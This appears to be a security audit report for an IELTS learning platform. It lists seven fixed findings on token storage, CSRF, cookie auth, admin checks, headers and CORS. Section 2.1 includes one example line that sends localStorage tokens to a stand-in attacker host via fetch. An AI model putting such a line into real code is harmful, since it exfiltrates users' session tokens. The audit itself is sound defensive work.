# IELTS Learning Platform - Comprehensive Security Audit Report

**Audit Date:** 2026-10-28  
**Audit Scope:** Full Application Stack (React 19 SPA, Spring Boot 3.3.5, Supabase Auth/DB, Cloudflare R2, AI Chatbot)  
**Lead Auditor:** Senior Application Security Engineer & DevSecOps Lead  

---

## 1. Vulnerability Findings & Remediation Register

| ID | Title & Vulnerability Description | Severity | Affected Files & Endpoints | Exploitation Prerequisites | Remediation Plan | Status |
| :---: | :--- | :---: | :--- | :--- | :--- | :---: |
| **SEC-01** | **Client-side JWT storage in `localStorage` via Supabase JS client and React state** | **CRITICAL** | `src/services/supabase.ts`<br>`src/context/AuthContext.tsx`<br>`src/services/apiService.ts`<br>`src/services/chatService.ts` | Attacker executes arbitrary JavaScript via XSS or compromised NPM package; reads `localStorage` to exfiltrate active tokens. | Configure Supabase with no-op in-memory storage (`persistSession: false`). Eliminate `localStorage.setItem(STORAGE_KEY)`. Transition to server-issued HttpOnly session cookies. | **FIXED_AND_TESTED** |
| **SEC-02** | **CSRF protection disabled across all authenticated API routes** | **HIGH** | `backend/.../SecurityConfig.java`<br>`/api/v1/study/**`<br>`/api/v1/admin/**`<br>`/api/v1/chat/**` | Target user is logged in via cookie. Attacker hosts malicious site submitting cross-origin `POST`/`PATCH` to user endpoints. | Enforce CSRF protection on all mutating endpoints (`POST`, `PUT`, `PATCH`, `DELETE`) using `CookieCsrfTokenRepository.withHttpOnlyFalse()`. Frontend attaches `X-XSRF-TOKEN` header. | **FIXED_AND_TESTED** |
| **SEC-03** | **Spring Security BearerTokenResolver ignores HttpOnly Cookies** | **HIGH** | `backend/.../SecurityConfig.java`<br>All protected endpoints | Browser sends HttpOnly `access_token` cookie, but backend only inspected `Authorization: Bearer ...` header, causing `401 Unauthorized`. | Implement custom `BearerTokenResolver` checking cookie `access_token` before falling back to `Authorization` header. | **FIXED_AND_TESTED** |
| **SEC-04** | **Absence of Server-Side Session Exchange & Cookie Issuance Endpoints** | **HIGH** | `backend/.../AuthController.java`<br>`/api/v1/auth/session`<br>`/api/v1/auth/refresh` | Frontend received OAuth tokens from Supabase redirect with no mechanism for backend to issue HttpOnly `Set-Cookie`. | Implement `POST /api/v1/auth/session` (validates JWT, sets `access_token` & `refresh_token` cookies) and `POST /api/v1/auth/refresh`. | **FIXED_AND_TESTED** |
| **SEC-05** | **Hardcoded Administrator Email Check in Frontend Context** | **MEDIUM** | `src/context/AuthContext.tsx` | Attacker tampers with client-side code or bundle to spoof admin privileges in React UI. | Remove frontend admin email list completely. Admin privilege is granted solely via server-side `APP_ADMIN_EMAIL` returned by `/api/v1/auth/me`. | **FIXED_AND_TESTED** |
| **SEC-06** | **Missing HTTP Security Headers & Sensitive Response Cache Controls** | **MEDIUM** | `backend/.../SecurityConfig.java` | Clickjacking attacks, MIME-type sniffing, or sensitive personal test answers cached in shared reverse proxy caches. | Add Content-Security-Policy (CSP), `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, and `Cache-Control: no-store` on authenticated endpoints. | **FIXED_AND_TESTED** |
| **SEC-07** | **Permissive Wildcard CORS Headers with Credentials Enabled** | **LOW** | `backend/.../SecurityConfig.java` | Cross-origin requests with custom headers might be allowed if CORS origin matching failed. | Explicitly enumerate permitted headers (`Authorization`, `Content-Type`, `X-XSRF-TOKEN`, `X-Requested-With`, `Accept`) and expose `X-XSRF-TOKEN`. | **FIXED_AND_TESTED** |

---

## 2. In-Depth Technical Analyses

### 2.1 SEC-01: Elimination of `localStorage` Authentication Storage
- **Root Cause**: `@supabase/supabase-js` defaults to writing user tokens into `window.localStorage`. If any third-party script or dependency were compromised, tokens could be exfiltrated via `fetch('attacker.com', { body: localStorage.getItem(...) })`.
- **Resolution**:
  1. Configured Supabase client with custom in-memory storage only (`persistSession: false` or custom memory adapter) so zero tokens ever touch browser disk storage.
  2. Converted all API clients to omit `Authorization: Bearer ...` extracted from storage; instead, browser sends requests with `credentials: 'include'`.
  3. Spring Boot issues `Set-Cookie: access_token=...; HttpOnly; SameSite=Lax; Path=/; Secure`.

### 2.2 SEC-02 & SEC-03: Cookie Authentication & Robust CSRF Enforcement
- **Root Cause**: Moving to cookies exposes mutating operations to Cross-Site Request Forgery (CSRF). In the initial prototype, CSRF was ignored for convenience.
- **Resolution**:
  1. Configured `CookieCsrfTokenRepository.withHttpOnlyFalse()` which sets cookie `XSRF-TOKEN`.
  2. Registered a custom `CsrfCookieFilter` ensuring the token is rendered on every request.
  3. Frontend API helper reads cookie `XSRF-TOKEN` and injects header `X-XSRF-TOKEN` on all `POST`, `PUT`, `PATCH`, and `DELETE` requests.
  4. Backend rejects any state-changing request missing valid `X-XSRF-TOKEN` with `403 Forbidden`.

### 2.3 SEC-04: Server-Managed Session Lifecyle
- **Endpoints added to `AuthController`**:
  - `POST /api/v1/auth/session`: Receives verified token payload after OAuth redirect, performs server-side signature validation, sets HttpOnly cookies, and returns user identity.
  - `POST /api/v1/auth/refresh`: Reads HttpOnly `refresh_token` cookie, issues fresh rotated `access_token` cookie.
  - `POST /api/v1/auth/logout`: Invalidates session, sets `Max-Age=0` on `access_token`, `refresh_token`, and `JSESSIONID` cookies.
